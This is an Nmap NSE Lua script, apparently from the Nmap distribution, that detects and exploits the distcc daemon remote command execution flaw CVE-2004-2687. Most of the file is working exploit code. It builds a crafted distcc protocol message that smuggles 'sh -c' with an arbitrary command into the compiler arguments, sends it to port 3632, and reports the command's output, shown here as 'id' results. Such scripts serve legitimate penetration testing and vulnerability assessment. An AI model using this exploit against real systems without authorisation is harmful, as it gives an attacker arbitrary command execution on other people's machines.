local nmap = require "nmap"
local match = require "match"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Detects and exploits a remote code execution vulnerability in the distributed
compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
present in modern implementation due to poor configuration of the service.
]]

---
-- @usage
-- nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"
--
-- @output
-- PORT     STATE SERVICE
-- 3632/tcp open  distccd
-- | distcc-exec:
-- |   VULNERABLE:
-- |   distcc Daemon Command Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2004-2687
-- |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       Allows executing of arbitrary commands on systems running distccd 3.1 and
-- |       earlier. The vulnerability is the consequence of weak service configuration.
-- |
-- |     Disclosure date: 2002-02-01
-- |     Extra information:
-- |
-- |     uid=118(distccd) gid=65534(nogroup) groups=65534(nogroup)
-- |
-- |     References:
-- |       https://distcc.github.io/security.html
-- |       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
--
-- @args cmd the command to run at the remote server
--

author = "Patrik Karlsson"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "vuln"}


portrule = shortport.port_or_service(3632, "distcc")

local arg_cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or "id"

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)

  local distcc_vuln = {
    title = "distcc Daemon Command Execution",
    IDS = {CVE = 'CVE-2004-2687'},
    risk_factor = "High",
    scores = {
      CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
    },
    description = [[
Allows executing of arbitrary commands on systems running distccd 3.1 and
earlier. The vulnerability is the consequence of weak service configuration.
]],
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2004-2687',
      'https://distcc.github.io/security.html',
    },
    dates = { disclosure = {year = '2002', month = '02', day = '01'}, },
    exploit_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  distcc_vuln.state = vulns.STATE.NOT_VULN

  local socket = nmap.new_socket()
  if ( not(socket:connect(host, port)) ) then
    return fail("Failed to connect to distcc server")
  end

  local cmds = {
    "DIST00000001",
    ("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
    "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
    "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
    "DOTI00000001A\n",
  }

  for _, cmd in ipairs(cmds) do
    if ( not(socket:send(cmd)) ) then
      return fail("Failed to send data to distcc server")
    end
  end

  -- Command could have lots of output, need to cut it off somewhere. 4096 should be enough.
  local status, data = socket:receive_buf(match.pattern_limit("DOTO00000000", 4096), false)

  if ( status ) then
    local output = data:match("SOUT%w%w%w%w%w%w%w%w(.*)")
    if (output and #output > 0) then
      distcc_vuln.extra_info = stdnse.format_output(true, output)
      distcc_vuln.state = vulns.STATE.EXPLOIT
      return report:make_output(distcc_vuln)
    end
  end
end
